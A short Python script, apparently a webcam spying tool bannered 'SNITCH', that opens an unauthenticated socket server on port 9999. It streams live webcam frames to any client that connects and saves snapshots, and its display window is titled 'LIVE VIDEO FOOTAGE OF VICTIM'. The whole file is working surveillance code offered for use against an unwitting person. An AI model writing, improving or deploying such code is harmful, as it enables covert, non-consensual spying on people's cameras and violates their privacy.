import cv2
import pickle
import socket
import struct
import time


def server():
    print('''
                                               _     __,..---""-._                 ';-,
                                        ,    _/_),-"`             '-.                `\\
                                       \|.-"`    -_)                 '.                ||
                                       /`   a   ,                      \              .'/
                                       '.___,__/                 .-'    \_        _.-'.'
                                          |\  \      \         /`        _`""""""`_.-'
                                             _/;--._, >        |   --.__/ `""""""`
                                           (((-'  __//`'-......-;\      )
                                                (((-'       __//  '--. /
                                                           (((-'    __//
                                                                 (((-'                                                                             
                                    ███████╗███╗   ██╗██╗████████╗ ██████╗██╗  ██╗
                                    ██╔════╝████╗  ██║██║╚══██╔══╝██╔════╝██║  ██║
                                    ███████╗██╔██╗ ██║██║   ██║   ██║     ███████║
                                    ╚════██║██║╚██╗██║██║   ██║   ██║     ██╔══██║
                                    ███████║██║ ╚████║██║   ██║   ╚██████╗██║  ██║
                                    ╚══════╝╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
         ''')
    #Stream Capture Variables

    img_counter = 0

    # Socket Create
    time.sleep(3)
    print("Launching host.......")
    time.sleep(5)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("")
    print("Server Launched Sucessfully")
    time.sleep(2)
    print("")
    host_name = socket.gethostname()
    host_ip = socket.gethostbyname(host_name)
    print('HOST IP:', host_ip)
    port = 9999
    socket_address = (host_ip, port)

    # Socket Bind
    server_socket.bind(socket_address)

    # Socket Listen
    server_socket.listen(5)
    print("LISTENING AT:", socket_address)
#accept socket
    while True:
        client_socket, addr = server_socket.accept()
        print('GOT CONNECTION FROM:', addr)
        if client_socket:
            vid = cv2.VideoCapture(0)
            while (vid.isOpened()):
                img, frame = vid.read()
                a = pickle.dumps(frame)
                message = struct.pack("Q", len(a)) + a
                client_socket.sendall(message)

                cv2.imshow('LIVE VIDEO FOOTAGE OF VICTIM', frame)
                key = cv2.waitKey(1) & 0xFF
                if key % 256 == 27:
                    # ESC pressed
                    print("Escape hit, closing...")
                    break
                elif key % 256 == 32:
                    # SPACE pressed
                    img_name = "opencv_frame_{}.png".format(img_counter)
                    cv2.imwrite(img_name, frame)
                    print("{} written!".format(img_name))
                    img_counter += 1

                if key == ord('q'):
                    client_socket.close()





server()

